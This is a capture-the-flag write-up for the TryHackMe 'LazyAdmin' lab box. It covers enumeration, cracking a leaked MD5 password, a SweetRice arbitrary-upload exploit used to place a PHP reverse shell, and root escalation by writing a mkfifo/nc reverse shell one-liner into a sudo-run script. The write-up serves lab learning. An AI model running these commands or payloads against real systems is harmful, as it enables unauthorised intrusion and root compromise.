# TryHackMe
------------------------------------
### IP: 10.10.97.171
### Name: LazyAdmin
### Difficulty: Easy
--------------------------------------------

lazyadmin.jpeg

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the --min-rate 10000 flag to speed things up. I'll also use the -sC and -sV to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/LazyAdmin]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.10.183.91
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-13 10:23 CDT
Nmap scan report for 10.10.183.91
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
```

Navigating to port 80 we find an apache landing page.

Kicking off some directory fuzzing we find a `/content` endpoint:

lazyadmin_dirs.png

Checking it out we see it is running Sweet Rice:

lazyadmin_sr.png

Navigating to http://10.10.183.91/content/as/ we find the sign-in page:

lazyadmin_signin.png

Looking back at our directory scanning, we find a `/inc` page, and in that directory we find a mysql backup file:

lazyadmin_backup.png

Taking a look at the file we find the manager's password hash:

lazyadmin_hash.png

This appears to be MD5, so lets crack it using Hashcat:

```
┌──(ryan㉿kali)-[~/THM/LazyAdmin]
└─$ hashcat hash /usr/share/wordlists/rockyou.txt -m 0  
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

42f749ade7f9e195bf475f37a44cafcb:Password123              
                                                          
Session..........: hashcat
Status...........: Cracked
```

Nice, we can now login with `manager:Password123`. 

lazyadmin_in.png

Looking for exploits for version 1.5.1 I find this arbitrary upload vulnerability: https://www.exploit-db.com/exploits/40716

Essentially the exploit is just logging in and uploading a PHP file, and then giving us the URL we can find the attachment at:

```python
<SNIP>
    uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass 
```

Lets give it a shot.

### Exploitation

First I'll grab a copy of PentestMonkey's php_reverse_shell.php and rename it to shell.php:

```
┌──(ryan㉿kali)-[~/THM/LazyAdmin]
└─$ mv php-reverse-shell.php shell.php5                   
                                                                                                                             
┌──(ryan㉿kali)-[~/THM/LazyAdmin]
└─$ subl shell.php5   
```

Note: There is likely some file blacklisting going on, so it's important to update the extension to .php5, rather than just .php

I'll then open it up and change the address I'll be listening on:

lazyadmin_script_update.png

Next I'll use the exploit to upload the file:

lazyadmin_exploit1.png

```
┌──(ryan㉿kali)-[~/THM/LazyAdmin]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.2.0.125] from (UNKNOWN) [10.10.183.91] 43616
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 19:11:19 up  1:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
THM-Chal
```

I can then grab the user.txt flag:

lazyadmin_user_flag.png

### Privilege Escalation

Running `sudo -l` to see what we can do with elevated permissions, we find we can execute a perl script as root:

```
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Digging a bit deeper, we see we can't modify backup.pl directly, but the script calls another script, copy.sh,  which we do have write access over. And oddly enough that script is a reverse shell one liner. So we should just be able to update copy.sh to our IP address, execute backup.pl with sudo, and catch a reverse shell as root.

lazyadmin_why.png

Update /etc/copy.sh
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.0.125 5554 >/tmp/f" > /etc/copy.sh
```

Set up a listener and execute backup.pl with sudo:
```
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
```

And we catch a shell as root where we can grab the final flag:

lazyadmin_root_flag.png

Thanks for following along!

-Ryan

----------------------------------------------